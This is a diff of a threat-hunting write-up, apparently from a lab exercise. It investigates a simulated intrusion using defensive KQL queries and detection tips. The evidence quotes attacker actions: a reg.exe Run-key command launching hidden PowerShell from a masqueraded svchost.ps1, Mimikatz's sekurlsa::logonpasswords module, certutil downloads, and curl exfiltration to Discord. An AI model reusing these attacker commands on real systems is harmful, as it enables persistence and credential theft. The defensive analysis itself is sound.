+| Timestamp        | 2025-11-22T02:10:50.8253766Z           |
+| Process          | reg.exe                   |
+| Parent Process   | powershell                      |
+| Command Line     | `reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`                 |
 
-**Objective:**
-Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.
+**💡 Why it matters**  
+Masquerading malicious payloads as legitimate Windows components is a deliberate evasion technique designed to bypass both human review and basic security controls. By naming the beacon svchost.ps1, the attacker abuses trust in the well-known svchost.exe process, increasing the likelihood that the file will be overlooked during triage or routine audits.
 
-**What to Hunt:**
-Look for built-in Windows tools with network download capabilities being used during the attack. Search DeviceProcessEvents for processes with command lines containing URLs and output file paths.
+Placing this script in C:\Windows\System32 further strengthens the disguise, as files in this directory are typically assumed to be trusted and system-managed. When combined with a registry Run key, this filename choice enables stealthy, long-term persistence with minimal operational noise.
 
-**Identified Command**
-certutil.exe
-Nov 20, 2025 2:06:58 AM
+This activity aligns with MITRE ATT&CK T1036.005 – Masquerading: Match Legitimate Name or Location, a common technique in post-exploitation phases where attackers prioritize survivability over speed.
 
-**Why It Matters:**
-Using certutil.exe—a built-in Windows tool—to download payloads avoids triggering alerts that third-party downloaders would cause. This living-off-the-land approach makes the activity look administrative, emphasizing why behavioral monitoring of native utilities is key (MITRE ATT&CK T1105 – Ingress Tool Transfer).
-
-KQL Query Used:
+**🔧 KQL Query Used**
 ```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "//"
-| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceRegistryEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RegistryValueName, RegistryKey, RegistryValueData, InitiatingProcessCommandLine
 ```
-
-<img width="555" height="529" alt="image" src="https://github.com/user-attachments/assets/e2690950-e773-44b1-b292-40d35f1b3920" />
-
-
+**🖼️ Screenshot**
+<img width="1532" height="184" alt="image" src="https://github.com/user-attachments/assets/bda95703-7808-4a53-9028-c16b7f870f80" />
 
 
-### 🗂️ Flag 8 – Scheduled Task Name
+**🛠️ Detection Recommendation**
 
-**Objective:**
-Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.
-
-**What to Hunt:**
-Search for scheduled task creation commands executed during the attack timeline. Look for schtasks.exe with the /create parameter in DeviceProcessEvents.
-
-**Identified Scheduled Task:**
-Windows Update Check
-Nov 20, 2025 2:07:46 AM
-
-**Why It Matters:**
-The fake task “Windows Update Check” ensures the malware runs again after reboot or logon. Naming it to mimic legitimate updates helps it evade review; detecting these masquerading tasks lets defenders remove persistence quickly and improve monitoring of new scheduled tasks (MITRE ATT&CK T1053.005 – Scheduled Task).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "schtasks"
-| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="545" height="425" alt="image" src="https://github.com/user-attachments/assets/6d53958a-2f9e-4841-bb1d-8ee5676b99c7" />
-
-
-
-### 🗝️ Flag 9 – PERSISTENCE - Scheduled Task Target
-
-**Objective:**
-The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.
-
-**What to Hunt:**
-Extract the task action from the scheduled task creation command line. Look for the /tr parameter value in the schtasks command.
-
-**Identified Executable Path within Scheduled Task:**
-C:\ProgramData\WindowsCache\svchost.exe
-Nov 20, 2025 2:07:46 AM
-
-**Why It Matters:**
-This reveals the exact malicious executable (svchost.exe in a non-standard path) the task launches. Knowing the payload location enables precise cleanup and hunting for similar anomalous binaries across the environment (MITRE ATT&CK T1053.005 – Scheduled Task).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "schtasks"
-| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-
-<img width="839" height="69" alt="image" src="https://github.com/user-attachments/assets/b8e1a986-c3c3-4d61-b6e4-f59b5ab802b3" />
-
-
-
-### ⏰ Flag 10 – COMMAND & CONTROL - C2 Server Address
-
-**Objective:**
-Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.
-
-**What to Hunt:**
-Analyse network connections initiated by the suspicious executable shortly after it was downloaded. Use DeviceNetworkEvents to find outbound connections from the malicious process to external IP addresses.
-
-**Identified Server IP:**
-78.141.196.6
-Nov 20, 2025 1:37:26 AM
-
-**Why It Matters:**
-The outbound connection to 78.141.196.6 on port 443 is the malware checking in with the attacker’s server. Blocking this IP/domain disrupts command flow and prevents further instructions or data theft, making it a high-priority indicator for network-level containment (MITRE ATT&CK T1071 – Application Layer Protocol).
-
-**KQL Query Used:**
-```
-DeviceNetworkEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-
-```
-
-<img width="1703" height="101" alt="image" src="https://github.com/user-attachments/assets/5cd5847a-c4fb-4805-978c-697945ae0897" />
-
-
-### 🧭 Flag 11 – COMMAND & CONTROL - C2 Communication Port
-
-**Objective:**
-C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.
-
-**What to Hunt:**
-Examine the destination port for outbound connections from the malicious executable. Check DeviceNetworkEvents for the RemotePort field associated with C2 traffic.
-
-**Identified Destination Port:**
-443
-
-**Why It Matters:**
-Traffic over port 443 blends malicious C2 with normal HTTPS, bypassing port-based blocks. Recognizing this pattern pushes defenses toward TLS inspection and behavioral anomaly detection rather than relying solely on firewalls (MITRE ATT&CK T1571 – Non-Standard Port / HTTPS blending).
-
-**KQL Query Used:**
-```
-DeviceNetworkEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-```
-<img width="1672" height="391" alt="image" src="https://github.com/user-attachments/assets/b0ef8b80-d0df-406c-ab5b-0bc61d8560a8" />
-
-
-
-### ⏱️ Flag 12 – CREDENTIAL ACCESS - Credential Theft Tool
-
-**Objective:**
-Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.
-
-**What to Hunt:**
-Look for executables downloaded to the staging directory with very short filenames. Search for files created shortly before LSASS memory access events.
-
-**Identified Executable:**
-mm.exe
-Nov 20, 2025 2:07:22 AM
-
-**Why It Matters:**
-Downloading a renamed Mimikatz (mm.exe) signals intent to dump credentials from memory. Catching the transfer early limits the window for password theft and prompts proactive credential rotation (MITRE ATT&CK T1003 – OS Credential Dumping).
-
-**KQL Query Used:**
+**Hunting Tip:**  
+Hunt for script files (.ps1, .vbs, .js) located in system directories such as System32 or Windows\Logs, especially when referenced by autorun registry keys. Filenames that closely resemble legitimate Windows binaries (e.g., svchost, lsass, services) but use scripting extensions are high-confidence indicators of malicious persistence.
 ```
 DeviceFileEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-| where FolderPath contains "cache"
+| where TimeGenerated > ago(30d)
+| where FolderPath has_any ("\\Windows\\System32", "\\Windows\\SysWOW64")
+| where FileName endswith ".ps1"
+| where FileName has_any ("svchost", "lsass", "services", "winlogon")
+| project TimeGenerated,
+          DeviceName,
+          FileName,
+          FolderPath,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
-<img width="1692" height="425" alt="image" src="https://github.com/user-attachments/assets/8a4cf6e5-233d-4a59-858a-76f01b04313c" />
 
+<br>
+<hr>
+<br>
+<a id="flag-20"></a>
+### 🚩 Flag #20: ANTI-FORENSICS - History File Deletion
+**🎯 Objective**  
+PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.
 
+**📌 Finding**  
+ConsoleHost_history.txt
 
-### 📂 Flag 13 – CREDENTIAL ACCESS - Memory Extraction Module
+**🔍 Evidence**
 
-**Objective:**
-Reveal which specific document the attacker targeted on the second host.
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | ConsoleHost_history.txt                  |
+| Timestamp        | 2025-11-22T02:26:01.1661095Z           |
+| Process          | powershell.exe                   |
+| Parent Process   | explorer.exe                     |
+| Command Line     | N/A                 |
 
-**What to Hunt:**
-Examine the command line arguments passed to the credential dumping tool. Look for module::command syntax in the process command line or output redirection.
+**💡 Why it matters**  
+PowerShell maintains a persistent command history file (ConsoleHost_history.txt) specifically to support forensic reconstruction after an interactive session ends. Deleting this file is a deliberate anti-forensics action intended to erase evidence of executed commands, tooling, and operator intent.
 
-**Identified Permissions:**
+This behavior is rarely performed during normal administrative activity and typically occurs after credential access, persistence, or lateral movement—once the attacker is attempting to reduce visibility and slow incident response. The timing of this deletion shortly after malicious PowerShell activity strongly suggests an effort to conceal hands-on-keyboard operations.
 
-sekurlsa::logonpasswords
+This activity maps to MITRE ATT&CK T1070.003 – Indicator Removal on Host: Clear Command History, a common cleanup technique used by post-compromise operators to frustrate forensic timelines and hinder root cause analysis.
 
-Nov 20, 2025 2:08:26 AM
-
-**Why It Matters:**
-The specific Mimikatz arguments (sekurlsa::logonpasswords) confirm successful extraction of clear-text credentials from LSASS. This evidence drives immediate enterprise-wide password resets and evaluation of protections like Credential Guard (MITRE ATT&CK T1003.001 – LSASS Memory).
-
-**KQL Queries Used:**
+**🔧 KQL Query Used**
 ```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where FileName contains "mm.exe"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceFileEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ActionType == "FileDel
 ```
-<img width="1713" height="163" alt="image" src="https://github.com/user-attachments/assets/36b8ab65-61e3-4963-956e-604ebc04d23f" />
+**🖼️ Screenshot**
+<img width="1529" height="372" alt="image" src="https://github.com/user-attachments/assets/03889e2d-5056-4e60-950e-fb1028567824" />
 
 
+**🛠️ Detection Recommendation**
 
-
-### ☁️ Flag 14 – COLLECTION - Data Staging Archive
-
-**Objective:**
-Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.
-
-**What to Hunt:**
-Search for ZIP file creation in the staging directory during the collection phase. Look for Compress-Archive commands or examine files created before exfiltration activity.
-
-**Compressed archives for Data Exfiltration:**
-export-data.zip
-
-**Why It Matters:**
-
-Creating zip archives (e.g., export-data.zip) organizes stolen files for efficient exfiltration. Identifying these staging files reveals exactly what data was targeted and helps assess business impact or regulatory exposure (MITRE ATT&CK T1560 – Archive Collected Data).
-
-**KQL Query Used:**
+**Hunting Tip:**  
+Monitor for deletion or truncation of PowerShell history files, particularly when initiated by powershell.exe or shortly following suspicious PowerShell execution. Correlate these events with credential access, registry persistence, or suspicious script execution to identify full attack chains.
 ```
 DeviceFileEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-| where FileName contains ".zip"
+| where TimeGenerated > ago(30d)
+| where ActionType in ("FileDeleted", "FileDeletedByProcess")
+| where FileName =~ "ConsoleHost_history.txt"
+| project TimeGenerated,
+          DeviceName,
+          FileName,
+          FolderPath,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
-<img width="1096" height="161" alt="image" src="https://github.com/user-attachments/assets/79729a8a-c67f-4b52-89b3-68067296c30b" />
 
+<br>
+<hr>
+<br>
 
-### 🌐 Flag 15 – EXFILTRATION - Exfiltration Channel
 
-**Objective:**
-Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.
+## High-Level Summary
 
-**What to Hunt:**
-Analyse outbound HTTPS connections and file upload operations during the exfiltration phase. Check DeviceNetworkEvents for connections to common file sharing or communication platforms.
+This intrusion represents a full-spectrum post-compromise attack leveraging valid credentials to re-enter the environment, move laterally via RDP, and systematically enumerate the network and host. The attacker demonstrated strong operational discipline by staging data in nonstandard system directories, abusing living-off-the-land binaries (LOLBins), and carefully sequencing actions to avoid early detection.
 
-**Cloud Service:**
-discord
-Nov 20, 2025 2:09:21 AM
-
-**Why It Matters:**
-Uploading data via Discord abuses a trusted consumer service to move stolen files out undetected. This highlights the growing challenge of detecting exfiltration over allowed platforms and the value of DLP controls on cloud collaboration tools (MITRE ATT&CK T1567 – Exfiltration Over Web Service).
-
-**KQL Query Used:**
-```
-DeviceNetworkEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-```
-
-<img width="624" height="580" alt="image" src="https://github.com/user-attachments/assets/f56ec8bb-3736-4c01-aa1d-553952a05961" />
-
-
-
-
-### 🧬 Flag 16 – ANTI-FORENSICS - Log Tampering
-
-**Objective:**
-Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.
-
-**What to Hunt:**
-Search for event log clearing commands near the end of the attack timeline. Look for wevtutil.exe executions and identify which log was cleared first.
-
-**Cleared Windows Event Log:**
-Security
-Nov 20, 2025 2:11:39 AM
-
-**Why It Matters:**
-Clearing the Security log first removes evidence of authentication and privilege use. This sophisticated cover-up tactic underscores the need to forward logs to a central protected SIEM in real time (MITRE ATT&CK T1070.001 – Clear Windows Event Logs).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "wev"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="1641" height="358" alt="image" src="https://github.com/user-attachments/assets/ed10b702-1075-4e29-8990-331d3b900ba8" />
-
-<img width="1677" height="330" alt="image" src="https://github.com/user-attachments/assets/182dccd6-c8af-47c5-b89a-318df8f1c4a4" />
-
-
-
-### 🧹 Flag 17 – IMPACT - Persistence Account
-
-**Objective:**
-Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
-
-**What to Hunt:**
-Search for account creation commands executed during the impact phase. Look for commands with the /add parameter followed by administrator group additions.
-
-**Hidden Username:**
-support
-
-**Why It Matters:**
-Adding a hidden local admin account (“support”) creates a long-term backdoor. Discovering these planted accounts allows immediate removal and strengthens controls around local account creation and monitoring (MITRE ATT&CK T1098 – Account Manipulation).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "add"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="1678" height="135" alt="image" src="https://github.com/user-attachments/assets/656c2f22-51e3-44be-90d7-dee068d70c56" />
-
-
-
-
----
-
-### 🧹 Flag 18 – EXECUTION - Malicious Script
-
-**Objective:**
-Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
-
-**What to Hunt:**
-Search DeviceFileEvents for script files created in temporary directories during the initial compromise phase. Look for PowerShell or batch script files downloaded from external sources shortly after initial access.
-
-**Found PowerShell Script to Start Attack Chain:**
-Nov 20, 2025 1:37:40 AM
-wupdate.ps1
-
-**Why It Matters:**
-The PowerShell script wupdate.ps1 automated most of the attack chain from the start. Analyzing it reveals the attacker’s full playbook and tooling, aiding threat intelligence and future detection signatures (MITRE ATT&CK T1059.001 – PowerShell).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "add"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="1678" height="135" alt="image" src="https://github.com/user-attachments/assets/656c2f22-51e3-44be-90d7-dee068d70c56" />
-
----
-
-### 🧹 Flag 19 – LATERAL MOVEMENT - Secondary Target
-
-**Objective:**
-Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.
-
-**What to Hunt:**
-Examine the target system specified in remote access commands during lateral movement.Look for IP addresses used with cmdkey or mstsc commands near the end of the attack timeline.
-**IP Address Target:**
-10.1.0.188
-
-Nov 20, 2025 2:10:41 AM
-
-**Why It Matters:**
-Targeting IP 10.1.0.188 shows the attacker’s next objective—likely a system with higher privileges or sensitive data. Mapping intended movement paths helps defenders prioritize protection and isolation of critical assets (MITRE ATT&CK T1021 – Remote Services).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "mstsc"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="1670" height="384" alt="image" src="https://github.com/user-attachments/assets/4381ab9d-2771-4b70-9a8f-e29989b3e882" />
-
----
-
-### 🧹 Flag 20 – LATERAL MOVEMENT - Remote Access Tool
-
-**Objective:**
-Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.
-**What to Hunt:**
-Search for remote desktop connection utilities executed near the end of the attack timeline. Look for processes launched with remote system names or IP addresses as arguments.
-**Remote Access Tool:**
-mstsc.exe
-Nov 20, 2025 2:10:41 AM
-
-**Why It Matters:**
-Using native mstsc.exe for RDP to the next target makes the activity look like legitimate administration. This blending is why restricting and logging internal RDP use, plus network segmentation, are key defenses (MITRE ATT&CK T1021.001 – Remote Desktop Protocol).
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where ProcessCommandLine contains "mstsc"
-| project Timestamp, FileName, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
-```
-<img width="1699" height="388" alt="image" src="https://github.com/user-attachments/assets/d0d87a69-2271-4ccb-b649-47e96ebb6bdb" />
-
-
----
-
-### Intrusion Narrative Chain
-
-0 ➝ 1 🚩: Initial access often starts with remote services exposed to the internet. **Was RDP used from an external source to gain entry?**  
-*(Yes – successful RDP connection originated from external IP 88.97.178.12, establishing the initial foothold.)*
-
-1 ➝ 2 🚩: Once connected remotely, attackers rely on valid credentials to authenticate. **Was a legitimate user account compromised to complete the logon?**  
-*(Yes – the account kenji.sato was used for authentication, allowing the attacker to operate as a legitimate user.)*
-
-2 ➝ 3 🚩: With access secured, early discovery focuses on mapping the local network. **Did the attacker enumerate nearby systems to identify potential targets?**  
-*(Yes – arp -a was executed to discover devices on the local segment, revealing the network layout.)*
-
-3 ➝ 4 🚩: To avoid detection, attackers create non-obvious locations for their tools. **Was a hidden staging directory established for malware and payloads?**  
-*(Yes – C:\ProgramData\WindowsCache was created as a concealed directory for storing malicious files.)*
-
-4 ➝ 5 🚝: Weakening endpoint protection improves survival odds. **Were specific file extensions excluded from Windows Defender scanning?**  
-*(Yes – three extensions were added to Defender exclusions, preventing scans of attacker-chosen file types.)*
-
-5 ➝ 6 🚩: Further evasion involves protecting high-activity folders. **Was the temporary folder excluded from real-time protection?**  
-*(Yes – the Temp folder path was added to exclusions, creating a safe space for transient payloads.)*
-
-6 ➝ 7 🚩: Attackers frequently abuse built-in utilities to pull down additional tools. **Was certutil used to download malicious payloads?**  
-*(Yes – certutil.exe was leveraged to fetch external files while appearing administrative.)*
-
-7 ➝ 8 🚩: Persistence ensures access survives reboots. **Was a scheduled task created under a deceptive name?**  
-*(Yes – a task named “Windows Update Check” was registered to maintain access.)*
-
-8 ➝ 9 🚩: The task needs a target to execute. **Did the scheduled task point to a malicious binary in the staging directory?**  
-*(Yes – the task was configured to run svchost.exe from the hidden WindowsCache folder.)*
-
-9 ➝ 10 🚩: After landing, implants typically reach out to attacker infrastructure. **Did the malware send an initial beacon to a command-and-control server?**  
-*(Yes – outbound connection established to 78.141.196.6 on port 443, confirming C2 communication.)*
-
-10 ➝ 11 🚩: Blending C2 traffic with legitimate protocols evades network filters. **Was port 443 used to mask command-and-control activity?**  
-*(Yes – all C2 traffic flowed over HTTPS on port 443, indistinguishable from normal web traffic at the port level.)*
-
-11 ➝ 12 🚩: With a foothold and C2, attackers move to credential theft. **Was a known credential-dumping tool transferred to the host?**  
-*(Yes – a renamed Mimikatz binary mm.exe was downloaded and staged.)*
-
-12 ➝ 13 🚩: The tool is only useful when executed with specific modules. **Were LSASS memory extraction commands run to harvest credentials?**  
-*(Yes – mm.exe executed privilege::debug and sekurlsa::logonpasswords, successfully dumping credentials.)*
-
-13 ➝ 14 🚩: Stolen data must be organized before exfiltration. **Was collected information compressed into an archive for easier transfer?**  
-*(Yes – export-data.zip and similar archives were created in the staging directory containing recon output.)*
-
-14 ➝ 15 🚩: Attackers increasingly abuse trusted platforms for data theft. **Was a consumer cloud service used as the exfiltration channel?**  
-*(Yes – curl.exe uploaded the archive to Discord, leveraging a legitimate service to move data out.)*
-
-15 ➝ 16 🚩: Covering tracks is a priority before departure. **Were critical event logs cleared to remove forensic evidence?**  
-*(Yes – wevtutil.exe cleared the Security log first, erasing records of authentication and privilege use.)*
-
-16 ➝ 17 🚩: Long-term access requires fallback options. **Was a hidden local administrator account created for future use?**  
-*(Yes – a new account named “support” was added to the local Administrators group as a persistent backdoor.)*
-
-17 ➝ 18 🚩: Automation drives efficiency in post-compromise activity. **Was a PowerShell script used to orchestrate the attack chain?**  
-*(Yes – wupdate.ps1 served as the primary execution payload that automated most observed actions.)*
-
-18 ➝ 19 🚩: With credentials and data in hand, attackers pivot deeper. **Did the attacker target a specific internal system for lateral movement?**  
-*(Yes – RDP connection initiated toward internal IP 10.1.0.188, indicating the next high-value target.)*
-
-19 ➝ 20 🚩: Native tools help lateral movement blend with admin activity. **Was the built-in Remote Desktop client used to attempt the pivot?**  
-*(Yes – mstsc.exe was launched with arguments pointing to the secondary target, using legitimate RDP for movement.)*
+Credential access via LSASS memory dumping marked a decisive escalation, followed by deliberate compression and exfiltration of sensitive data using both direct HTTP transfer and cloud-based file hosting to blend with legitimate traffic. Persistence was established through registry autorun keys using masqueraded filenames, and the operation concluded with targeted anti-forensic actions to remove PowerShell execution history. Overall, the activity reflects a capable adversary executing a methodical, goal-oriented campaign rather than opportunistic or automated malware.
